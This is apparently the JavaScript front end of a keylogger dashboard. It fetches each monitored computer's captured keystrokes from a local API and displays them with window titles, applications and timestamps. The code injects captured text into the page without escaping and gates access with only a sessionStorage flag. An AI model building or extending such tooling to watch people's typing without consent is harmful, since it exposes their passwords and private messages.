const API_URL = 'http://localhost:5000/api';

let allLogs = [];
let lastFilters = {
    date: '',
    window: '',
    search: ''
};

// בדיקת התחברות בתחילת הקוד
function checkAuth() {
    if (!sessionStorage.getItem('isLoggedIn')) {
        window.location.href = 'login.html';
        return false;
    }
    return true;
}

// הוספת פונקציית התנתקות
function logout() {
    sessionStorage.removeItem('isLoggedIn');
    window.location.href = 'login.html';
}

async function fetchLogs() {
    try {
        const selectedComputer = sessionStorage.getItem('selectedComputer');
        if (!selectedComputer) {
            window.location.href = 'computers.html';
            return;
        }

        const response = await fetch(`${API_URL}/logs/${selectedComputer}`);
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        const data = await response.json();
        console.log('Received logs:', data);
        
        if (Array.isArray(data)) {
            allLogs = data;
            
            // שמירת הפילטרים הנוכחיים לפני העדכון
            lastFilters = {
                date: document.getElementById('dateFilter').value,
                window: document.getElementById('windowFilter').value,
                search: document.getElementById('searchText').value
            };
            
            // עדכון רשימת החלונות בלי לאפס את הבחירה הנוכחית
            const currentWindow = document.getElementById('windowFilter').value;
            updateWindowFilter(data);
            if (currentWindow) {
                document.getElementById('windowFilter').value = currentWindow;
            }
            
            // החזרת הפילטרים למצבם הקודם
            document.getElementById('dateFilter').value = lastFilters.date;
            document.getElementById('windowFilter').value = lastFilters.window;
            document.getElementById('searchText').value = lastFilters.search;
            
            // הפעלת הפילטרים עם הערכים השמורים
            applyFilters();
        } else {
            console.error('Expected array of logs but got:', data);
            document.getElementById('logsContainer').innerHTML = 
                '<div class="alert alert-warning">התקבל מידע לא תקין מהשרת</div>';
        }
    } catch (error) {
        console.error('Error fetching logs:', error);
        document.getElementById('logsContainer').innerHTML = 
            `<div class="alert alert-danger">שגיאה בטעינת הנתונים: ${error.message}</div>`;
    }
}

function updateWindowFilter(logs) {
    const windowFilter = document.getElementById('windowFilter');
    // שינוי האופן שבו אנחנו מקבלים את שמות החלונות
    const windows = [...new Set(logs.map(log => log.window.title))];
    
    windowFilter.innerHTML = '<option value="">כל החלונות</option>' +
        windows.map(window => `<option value="${window}">${window}</option>`).join('');
}

function applyFilters() {
    const dateFilter = document.getElementById('dateFilter').value;
    const windowFilter = document.getElementById('windowFilter').value;
    const searchText = document.getElementById('searchText').value.toLowerCase();

    let filteredLogs = [...allLogs];

    if (dateFilter) {
        filteredLogs = filteredLogs.filter(log => log.timestamp.startsWith(dateFilter));
    }
    if (windowFilter) {
        // שינוי הפילטור כך שיתאים לשם החלון
        filteredLogs = filteredLogs.filter(log => log.window.title === windowFilter);
    }
    if (searchText) {
        filteredLogs = filteredLogs.filter(log => 
            log.keystrokes.toLowerCase().includes(searchText));
    }

    displayLogs(filteredLogs, searchText);
}

function getWindowIcon(windowInfo) {
    if (windowInfo.type === 'Browser') {
        return 'fa-globe';
    } else if (windowInfo.type === 'Editor') {
        return 'fa-edit';
    }
    return 'fa-window-maximize';
}

function formatContent(content) {
    return content
        .replace(/\[Backspace\]/g, '<span class="special-key">⌫</span>')
        .replace(/\[Delete\]/g, '<span class="special-key">Del</span>')
        .replace(/\[Shift\]/g, '<span class="special-key">⇧</span>')
        .replace(/\[Ctrl\]/g, '<span class="special-key">⌃</span>')
        .replace(/\[Alt\]/g, '<span class="special-key">⌥</span>')
        .replace(/\[Key\.esc\]/g, '')     // הסתרת Key.esc
        .replace(/\[Key\.escape\]/g, '')   // הסתרת Key.escape
        .replace(/\[Escape\]/g, '')        // הסתרת Escape
        .replace(/\[ESC\]/g, '')          // הסתרת ESC
        .replace(/\n/g, '<br>')
        .replace(/\t/g, '&nbsp;&nbsp;&nbsp;&nbsp;');
}

function displayLogs(logs, highlightText = '') {
    const container = document.getElementById('logsContainer');
    
    if (logs.length === 0) {
        container.innerHTML = '<div class="alert alert-info">לא נמצאו רשומות</div>';
        return;
    }

    container.innerHTML = logs.map(log => {
        const windowIcon = getWindowIcon(log.window);
        let content = formatContent(log.keystrokes);
            
        if (highlightText) {
            const regex = new RegExp(`(${highlightText})`, 'gi');
            content = content.replace(regex, '<mark>$1</mark>');
        }

        return `
        <div class="log-entry">
            <div class="window-info">
                <div class="window-icon">
                    <i class="fas ${windowIcon}"></i>
                </div>
                <div class="window-details">
                    <div class="window-title">${log.window.title}</div>
                    <div class="window-meta">
                        <span class="app-name">${log.window.application}</span>
                        ${log.window.browser ? `- ${log.window.browser}` : ''}
                        <br>
                        <span class="timestamp">${log.timestamp}</span>
                    </div>
                </div>
            </div>
            <div class="log-content">${content}</div>
        </div>`;
    }).join('');
}

// Add this temporarily for debugging
document.addEventListener('DOMContentLoaded', () => {
    console.log('Current page URL:', window.location.href);
    const img = new Image();
    img.onload = () => console.log('Image loaded successfully');
    img.onerror = () => console.error('Image failed to load');
    img.src = 'images/background.jpg';
});

// טעינה ראשונית ורענון כל 10 שניות
document.addEventListener('DOMContentLoaded', () => {
    if (!checkAuth()) return;
    
    fetchLogs();
    setInterval(fetchLogs, 10000);
    
    ['dateFilter', 'windowFilter', 'searchText'].forEach(id => {
        document.getElementById(id)?.addEventListener('input', applyFilters);
    });
});
